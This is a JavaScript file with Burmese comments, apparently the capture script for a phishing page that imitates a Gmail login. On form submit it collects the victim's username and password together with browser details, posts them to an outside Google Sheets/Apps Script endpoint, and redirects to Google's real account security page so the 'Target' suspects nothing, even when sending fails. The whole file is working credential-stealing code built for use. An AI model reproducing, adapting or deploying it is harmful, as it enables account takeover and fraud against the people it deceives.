// capture.js - Final Script for Apps Script Backend

// ====================================================================
// ⚠️ ဤနေရာတွင် Bro ၏ Google Apps Script Deployment URL ကို ထည့်ပါ။
// ဥပမာ: 'https://script.google.com/macros/s/AKfycb_RANDOM_CODE_HERE/exec'
// ====================================================================

const LOGGING_ENDPOINT = 'https://docs.google.com/spreadsheets/d/1ib-v7KMJNvIoNY7H4zEDi3PIHJfPE_mnUfJeaXzmyjs/edit?usp=drivesdk'; 

const REDIRECT_URL = 'https://myaccount.google.com/security';

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault(); 

        // 1. Input Data တွေ ဖမ်းယူခြင်း
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // 2. Client Info တွေ ဖမ်းယူခြင်း
        const userAgent = navigator.userAgent;
        const timestamp = new Date().toISOString();

        // Data တွေကို JSON Object အဖြစ် စုစည်းမယ်
        // Note: Code.gs က ဒီ Key Names တွေကိုပဲ မျှော်လင့်နေတာ (gmail_username, gmail_password)
        const payload = {
            timestamp: timestamp,
            user_agent: userAgent,
            gmail_username: username,
            gmail_password: password
        };

        // 3. Fetch API ကို သုံးပြီး Apps Script Web App ဆီကို JSON Format နဲ့ POST request ပို့မယ်
        fetch(LOGGING_ENDPOINT, {
            method: 'POST',
            headers: {
                // Apps Script က JSON Data ကို လက်ခံဖို့ ဒီ Header လိုတယ်။
                'Content-Type': 'application/json', 
            },
            body: JSON.stringify(payload), // JSON object ကို String အဖြစ်ပြောင်းပြီး ပို့မယ်
            mode: 'no-cors' // CORS issue တွေ ရှောင်ရှားဖို့
        })
        .then(response => {
            console.log('Credentials sent successfully to Apps Script Backend.');
            // 4. Data ပို့ပြီးတာနဲ့ Target ကို Redirect လုပ်မယ်
            window.location.href = REDIRECT_URL;
        })
        .catch(error => {
            // Network error ရှိရင်တောင် Target က သတိမထားမိစေဖို့ Redirect လုပ်မယ်
            console.error('Error sending data, but redirecting anyway:', error);
            window.location.href = REDIRECT_URL;
        });

    });
});
